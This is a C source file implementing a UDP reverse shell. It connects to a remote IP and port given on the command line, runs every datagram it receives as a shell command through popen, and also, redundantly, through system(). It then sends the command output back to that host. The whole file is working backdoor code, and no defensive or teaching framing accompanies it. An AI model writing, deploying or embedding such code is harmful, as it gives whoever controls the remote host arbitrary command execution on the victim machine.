#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <errno.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define BUFFSIZE 1024
static int check_port(const char *s) {
    // strtol() would also accept leading whitespace and +, - signs
    if (!isdigit((unsigned char)s[0]))
        return -1;

    char *end;
    errno = 0;
    long v = strtol(s, &end, 10);
    if (errno != 0 || *end != '\0' || v < 1 || v > 65535)
        return -1;
    return (int)v;
}

static int check_IP_version(const char *ip, int port, struct sockaddr_storage *addr, socklen_t *len) {
    struct sockaddr_in  *addr4 = (struct sockaddr_in *)addr;
    struct sockaddr_in6 *addr6 = (struct sockaddr_in6 *)addr;

    memset(addr, 0, sizeof(*addr));
    if (inet_pton(AF_INET, ip, &addr4->sin_addr) == 1) {
        addr4->sin_family = AF_INET;
        addr4->sin_port = htons((uint16_t)port);
        *len = sizeof(*addr4);
        return 0;
    }

    memset(addr, 0, sizeof(*addr));
    if (inet_pton(AF_INET6, ip, &addr6->sin6_addr) == 1) {
        addr6->sin6_family = AF_INET6;
        addr6->sin6_port = htons((uint16_t)port);
        *len = sizeof(*addr6);
        return 0;
    }

    return -1;
}

int main(int argc, char** argv){
  if(argc != 5){
    fprintf(stderr, "Usage: %s <local IP address > <local PORT> <client IP addres> <client PORT number>\n",argv[0]);
    exit(EXIT_FAILURE);
  }

    int local_port = check_port(argv[2]);
    if (local_port < 0) {
        fprintf(stderr, "[-]PORT (must be 1-65535)\n");
        exit(EXIT_FAILURE);
    }
    int client_port  = check_port(argv[4]);
    if (client_port < 0) {
        fprintf(stderr, "[-]PORT (must be 1-65535)\n");
        exit(EXIT_FAILURE);
    }

    struct sockaddr_storage local_addr, client_addr;
    socklen_t local_addr_len, client_addr_len;

    if (check_IP_version(argv[1], local_port, &local_addr, &local_addr_len) < 0) {
        fprintf(stderr, "[-] Invalid local IP address\n");
        exit(EXIT_FAILURE);
    }
    if (check_IP_version(argv[3], client_port, &client_addr, &client_addr_len) < 0) {
        fprintf(stderr, "[-] Invalid server IP address\n");
        exit(EXIT_FAILURE);
    }
    if (client_addr.ss_family != local_addr.ss_family) {
        fprintf(stderr, "[-] Local IP and server IP must be the same version (both IPv4 or both IPv6)\n");
        exit(EXIT_FAILURE);
    }

    
    int sockfd = socket(local_addr.ss_family, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        perror("[-] SOKCET");
        exit(EXIT_FAILURE);
    }
  int opt = 1;
    if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt)) < 0) {
        perror("[-] setsockopt(SO_REUSEADDR)");
        close(sockfd);
        exit(EXIT_FAILURE);
    }

    #ifdef SO_REUSEPORT
      if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEPORT, &opt, sizeof(opt)) < 0) {
          perror("[-] setsockopt(SO_REUSEPORT)");
          close(sockfd);
          exit(EXIT_FAILURE);
      }
    #endif

    
    if (bind(sockfd, (struct sockaddr *)&local_addr, local_addr_len) < 0) {
        perror("[-] BIND");
        close(sockfd);
        exit(EXIT_FAILURE);
    }

    if (connect(sockfd, (struct sockaddr *)&client_addr, client_addr_len) < 0) {
        perror("[-] CONNECT");
        close(sockfd);
        exit(EXIT_FAILURE);
    }

  

    while(1) {
    char buff[1024];
    ssize_t recved = recv(sockfd, buff, sizeof(buff) - 1, 0);
    if (recved < 0) {
        perror("recv[-]");
        close(sockfd);
        exit(EXIT_FAILURE);
    }

    buff[recved] = '\0';
    buff[strcspn(buff, "\r\n")] = '\0';

    if (strlen(buff) == 0) continue;

    char cmd_with_err[BUFFSIZE + 10];
    snprintf(cmd_with_err, sizeof(cmd_with_err), "%s 2>&1", buff);

    FILE *fp = popen(cmd_with_err, "r");
    if (fp == NULL) {
       const char *err_msg = "Error: failed to execute command\n";
        send(sockfd, err_msg, strlen(err_msg), 0);
        continue;
    }

    int cmd = system(buff);

    char response[BUFFSIZE];
    size_t read = fread(response, 1, sizeof(response) - 1, fp);
    int status = pclose(fp);

    if (read > 0) {
        response[read] = '\0';
        send(sockfd, response, read, 0);
    } else {
        char status_msg[128];
        snprintf(status_msg, sizeof(status_msg),
                 "(Command executed with exit code %d, no stdout output)\n",
                 WEXITSTATUS(status));
        send(sockfd, status_msg, strlen(status_msg), 0);
    }
  }
  close(sockfd);

 return 0;
}
